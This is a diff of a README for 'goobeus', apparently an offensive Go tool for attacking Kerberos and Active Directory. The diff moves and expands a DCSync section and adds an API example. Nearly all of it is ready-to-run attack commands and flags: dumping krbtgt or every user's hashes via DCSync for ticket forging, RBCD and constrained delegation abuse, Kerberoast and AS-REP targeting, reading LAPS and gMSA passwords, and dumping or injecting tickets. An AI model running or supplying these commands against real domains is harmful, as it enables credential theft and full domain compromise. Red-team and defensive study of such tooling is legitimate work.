@@ -47,6 +47,8 @@ go build -o goobeus ./cmd/goobeus
 -v, --verbose   Verbose output
 ```
 
+## Command Reference
+
 ### TGT Operations
 
 ```bash
@@ -60,11 +62,37 @@ goobeus -d corp.local -u jsmith -r aad3b435b51404eeaad3b435b51404ee asktgt
 goobeus -d corp.local -u jsmith -a <aes256_key> asktgt
 
 # Export as .ccache (for Linux tools like Impacket)
-goobeus -d corp.local -u jsmith -p 'Password!' -f ccache -o jsmith.ccache asktgt
+goobeus -d corp.local -u jsmith -p 'Password!' -o jsmith.ccache asktgt
 
 # Export as .kirbi (for Windows tools)
-goobeus -d corp.local -u jsmith -p 'Password!' -f kirbi -o jsmith.kirbi asktgt
+goobeus -d corp.local -u jsmith -p 'Password!' -o jsmith.kirbi asktgt
 ```
+
+### DCSync
+
+Extract credentials from a Domain Controller using the MS-DRSR replication protocol.
+
+**Required Privileges**: `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`  
+**Default Holders**: Domain Admins, Enterprise Admins, Domain Controllers
+
+```bash
+# DCSync single user (extract krbtgt for Golden Ticket attacks)
+goobeus -d corp.local -u admin -p 'Password!' dcsync --user krbtgt --dc dc01.corp.local
+
+# DCSync ALL domain users (like secretsdump.py)
+goobeus -d corp.local -u admin -p 'Password!' dcsync --all --dc dc01.corp.local
+
+# Use NT hash for authentication
+goobeus -d corp.local -u admin -r <nt_hash> dcsync --user krbtgt --dc dc01.corp.local
+```
+
+**DCSync Flags:**
+
+- `--user <username>` - Target user to extract (e.g., krbtgt, Administrator)
+- `--dc <hostname>` - Domain Controller hostname/IP
+- `--all` - Dump all domain users (like secretsdump -just-dc)
+
+> **Output**: Returns NT hash, AES256, and AES128 keys for extracted users. The AES256 key from krbtgt is perfect for Diamond/Sapphire ticket forging!
 
 ### Ticket Forgery
 
@@ -101,21 +129,6 @@ goobeus kerberoast --spn MSSQLSvc/sql01.corp.local:1433
 goobeus asreproast --domain corp.local --dc dc01.corp.local --users users.txt
 ```
 
-### DCSync
-
-```bash
-# DCSync single user (extract krbtgt for Golden Ticket attacks)
-goobeus -d corp.local -u admin -p 'Password!' dcsync --user krbtgt --dc dc01.corp.local
-
-# DCSync ALL domain users (like secretsdump.py)
-goobeus -d corp.local -u admin -p 'Password!' dcsync --all --dc dc01.corp.local
-
-# Use NT hash for authentication
-goobeus -d corp.local -u admin -r <nt_hash> dcsync --user krbtgt --dc dc01.corp.local
-```
-
-> **DCSync Output**: Returns NT hash, AES256, and AES128 keys for extracted users. The AES256 key from krbtgt is perfect for Diamond/Sapphire ticket forging!
-
 ### Delegation Attacks
 
 ```bash
@@ -123,44 +136,80 @@ goobeus -d corp.local -u admin -r <nt_hash> dcsync --user krbtgt --dc dc01.corp.
 goobeus -d corp.local -u svc_sql -r <hash> s4u \
   --impersonate administrator --msdsspn cifs/dc01.corp.local
 
-# Resource-Based Constrained Delegation (RBCD) abuse
-goobeus -d corp.local -u attacker -p 'Password!' rbcd \
-  --target dc01$ --delegate attacker_machine$ --dc dc01.corp.local
+# Resource-Based Constrained Delegation (RBCD) attack
+goobeus -d corp.local -t machine.kirbi rbcd --action attack \
+  --spn cifs/target.corp.local --impersonate Administrator
 
-# Standard constrained delegation
-goobeus -d corp.local -u svc_account -r <hash> constrained \
-  --impersonate administrator --service cifs/target.corp.local
+# Configure RBCD (add SID to msDS-AllowedToActOnBehalfOfOtherIdentity)
+goobeus -d corp.local rbcd --action write --target CN=TARGET,... --sid S-1-5-21-...
+
+# Standard constrained delegation attack
+goobeus -d corp.local -t svc_account.kirbi constrained \
+  --impersonate administrator --spn cifs/target.corp.local
+
+# Use alternative service class
+goobeus constrained --spn http/target.corp.local --altservice ldap ...
 ```
+
+**RBCD Flags:**
+
+- `--action <read|write|attack|clear>` - Action to perform (default: read)
+- `--target <DN>` - Target computer distinguished name
+- `--sid <SID>` - Machine account SID to add
+- `--impersonate <user>` - User to impersonate (default: Administrator)
+- `--spn <SPN>` - Target SPN for attack action
+
+**Constrained Delegation Flags:**
+
+- `--impersonate <user>` - User to impersonate (default: Administrator)
+- `--spn <SPN>` - Target SPN from msDS-AllowedToDelegateTo
+- `--altservice <service>` - Alternative service class (e.g., ldap, http)
 
 ### ADWS Enumeration
 
 Enumerate Active Directory via ADWS (port 9389) - no LDAP required:
 
 ```bash
-# Enumerate users with SPNs (Kerberoast targets)
-goobeus -d corp.local -u user -p 'Password!' enumerate --spn --dc dc01.corp.local
-
-# Enumerate AS-REP roastable users
-goobeus -d corp.local -u user -p 'Password!' enumerate --asrep --dc dc01.corp.local
-
-# Enumerate delegation configurations
-goobeus -d corp.local -u user -p 'Password!' enumerate --delegation --dc dc01.corp.local
-
-# Enumerate LAPS passwords
-goobeus -d corp.local -u admin -p 'Password!' enumerate --laps --dc dc01.corp.local
-
-# Enumerate gMSA passwords
-goobeus -d corp.local -u user -p 'Password!' enumerate --gmsa --dc dc01.corp.local
-
-# Enumerate groups
-goobeus -d corp.local -u user -p 'Password!' enumerate --groups --dc dc01.corp.local
-
-# Enumerate computers
-goobeus -d corp.local -u user -p 'Password!' enumerate --computers --dc dc01.corp.local
+# List available enumeration modes
+goobeus enumerate
 
 # BloodHound-compatible JSON collection
-goobeus -d corp.local -u user -p 'Password!' enumerate --bloodhound --dc dc01.corp.local
+goobeus -d corp.local enumerate bloodhound
+
+# Enumerate users with SPNs (Kerberoast targets)
+goobeus -d corp.local enumerate spn
+
+# Enumerate AS-REP roastable users
+goobeus -d corp.local enumerate asrep
+
+# Enumerate delegation configurations
+goobeus -d corp.local enumerate delegation
+
+# Enumerate LAPS passwords
+goobeus -d corp.local enumerate laps
+
+# Enumerate gMSA accounts
+goobeus -d corp.local enumerate gmsa
+
+# Enumerate privileged groups (Domain Admins, Enterprise Admins, etc.)
+goobeus -d corp.local enumerate groups
+
+# Enumerate computers (with OS breakdown)
+goobeus -d corp.local enumerate computers
 ```
+
+**Enumeration Modes:**
+
+| Mode | Description |
+|------|-------------|
+| `bloodhound` | BloodHound collection (ZIP with JSON) |
+| `spn` | Kerberoastable accounts |
+| `asrep` | AS-REP roastable accounts |
+| `delegation` | Delegation configurations (unconstrained, constrained, RBCD) |
+| `laps` | LAPS passwords (if readable) |
+| `gmsa` | gMSA accounts |
+| `groups` | Privileged group members |
+| `computers` | All computers with OS statistics |
 
 ### Ticket Management
 
@@ -170,7 +219,7 @@ goobeus describe --ticket admin.kirbi
 goobeus describe --ticket admin.ccache
 
 # Convert between formats
-goobeus describe --ticket admin.kirbi --out admin.ccache --format ccache
+goobeus describe --ticket admin.kirbi --out admin.ccache
 
 # Hash password to Kerberos keys
 goobeus hash --password 'Password123!' --domain corp.local --user jsmith
@@ -180,6 +229,8 @@ goobeus -d corp.local -u jsmith -p 'OldPass!' changepw --new 'NewPass123!'
 ```
 
 ### Windows-Specific Commands
+
+These commands interact with the Windows Kerberos credential cache and require running on Windows:
 
 ```bash
 # Pass-the-ticket (inject into current session)
@@ -191,7 +242,7 @@ goobeus.exe dump
 # Dump all tickets (requires elevation)
 goobeus.exe dump --all
 
-# Triage/list cached tickets (alias for dump)
+# Triage/list cached tickets (aliases for dump)
 goobeus.exe triage
 goobeus.exe klist
 
@@ -250,6 +301,16 @@ sapphireResult, err := forge.ForgeSapphireTicket(ctx, &forge.SapphireTicketReque
     KrbtgtAES256: krbtgtKey,
     KDC:          "dc01.corp.local",
 })
+
+// DCSync to extract credentials
+dcResult, err := dcsync.DCSync(ctx, &dcsync.DCSyncRequest{
+    DC:         "dc01.corp.local",
+    Domain:     "corp.local",
+    Username:   "admin",
+    Password:   "Password!",
+    TargetUser: "krbtgt",
+})
+// dcResult.NTHash, dcResult.AES256, dcResult.AES128
 ```
 
 ## Ticket Formats
@@ -260,7 +321,7 @@ sapphireResult, err := forge.ForgeSapphireTicket(ctx, &forge.SapphireTicketReque
 | ccache | `.ccache` | Linux tools (Impacket, krb5) |
 | base64 | - | Command-line passing, embedding |
 
-Both formats are fully supported for input and output. Use `--format` to specify output format.
+Both formats are fully supported for input and output. Output format is auto-detected from file extension.
 
 ## Credential Input Formats
 
